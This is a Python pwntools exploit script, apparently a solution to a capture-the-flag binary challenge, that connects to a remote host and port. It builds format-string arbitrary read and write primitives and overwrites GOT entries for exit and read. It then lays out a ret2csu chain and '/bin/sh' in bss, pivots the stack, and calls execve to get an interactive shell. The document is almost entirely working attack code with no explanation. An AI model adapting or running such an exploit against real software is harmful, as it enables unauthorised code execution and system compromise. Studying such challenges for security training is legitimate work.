from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './prob'
HOST = '34.64.203.138'
PORT = 10003

TIME = 0.5
elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def aaw(where, what, leng=6):
    total = 0
    payload = b''
    offset = 0
    for i in range(leng):
        c = ((what >> (i * 8)) - offset) % 0x100
        if c == 0:
            c = 0x100
        payload += f"%{c}c%{i+16}$hhn".encode()
        offset += c
        total += c
    # care full buffered remote
    payload += f"%{0x1000-total+1}c".encode()
    payload = payload.ljust(0x50, b'\x00')
    for i in range(leng):
        payload += p64(where + i)
    payload = payload.ljust(0x100, b'\x00')
    r.send(payload)
    ret = r.recvrepeat(TIME)
    assert(len(ret) == 0x1000)

def aar(where, leng=6):
    payload = b''
    payload += f"%8$s%{0x1000-leng}c".encode()
    assert(len(payload) < 0x10)
    payload = payload.ljust(0x10, b'\x00')
    payload += p64(where)
    payload = payload.ljust(0x100, b'\x00')
    r.send(payload)
    ret = r.recvrepeat(TIME)
    assert(len(ret) == 0x1000)
    leak = u64(ret[1:7].ljust(8, b'\x00'))
    return leak

def leak_stack():
    payload = b''
    payload += f"%p%{0x1000-14}c".encode()
    payload = payload.ljust(0x100, b'\x00')
    r.send(payload)
    ret = r.recvrepeat(TIME)
    assert(len(ret) == 0x1000)
    leak = int(ret[1:], 16)
    return leak

r = start()
if args.D:
	debug(r, [])

bss = 0x601280
rdi = 0x00400633
rsi_p1 = 0x00400631
csu_exec = 0x400610
csu_load = 0x40062a
rsp_p3 = 0x0040062d

# inf loop
aaw(elf.got.exit, elf.sym.main)

# place /bin/sh
aaw(bss, u32(b'/bin'), leng=4)
aaw(bss+4, u32(b'/sh\x00'), leng=4)

# partial overwrite read -> syscall
aaw(bss+0x08, (csu_load))
aaw(bss+0x10, (0))
aaw(bss+0x18, (1))
aaw(bss+0x20, (elf.got.read))
aaw(bss+0x28, (0))
aaw(bss+0x30, (elf.got.read))
aaw(bss+0x38, (1))
aaw(bss+0x40, (csu_exec))

# write(1, x, 0x3b) -> rax = 0x3b
#aaw(bss+0x48, (0xbeef))
aaw(bss+0x50, (0))
aaw(bss+0x58, (1))
aaw(bss+0x60, (elf.got.read))
aaw(bss+0x68, (1))
aaw(bss+0x70, (bss))
aaw(bss+0x78, (0x3b))# rax 0x3b
aaw(bss+0x80, (csu_exec))

# execve('/bin/sh', 0, 0)
#aaw(bss+0x88, (0xbeef))
aaw(bss+0x90, (0))
aaw(bss+0x98, (1))
aaw(bss+0xa0, (elf.got.read))
aaw(bss+0xa8, (bss))
aaw(bss+0xb0, (0))
aaw(bss+0xb8, (0))
aaw(bss+0xc0, (csu_exec))

def aaw_with_rop(where, what, leng=6):
    total = 0
    payload = b''
    offset = 0
    for i in range(leng):
        c = ((what >> (i * 8)) - offset) % 0x100
        if c == 0:
            c = 0x100
        payload += f"%{c}c%{i+12}$hhn".encode()
        offset += c
        total += c
    payload += f"%{0x1000-total+1}c".encode()
    payload = payload.ljust(0x20, b'\x00')
    payload += flat(rdi+1, 0x400630)
    payload = payload.ljust(0x30, b'\x00')
    for i in range(leng):
        payload += p64(where + i)

    # pivot to bss
    payload += flat(rsp_p3, bss-0x10)
    payload = payload.ljust(0x100, b'\x00')
    r.send(payload)
    ret = r.recvrepeat(TIME)
    assert(len(ret) == 0x1000)
    if args.R:
        r.send(b'\xd0')
    else:
        r.send(b'\x90')

aaw_with_rop(elf.got.exit, 0x062b, leng=2)

r.interactive()
r.close()
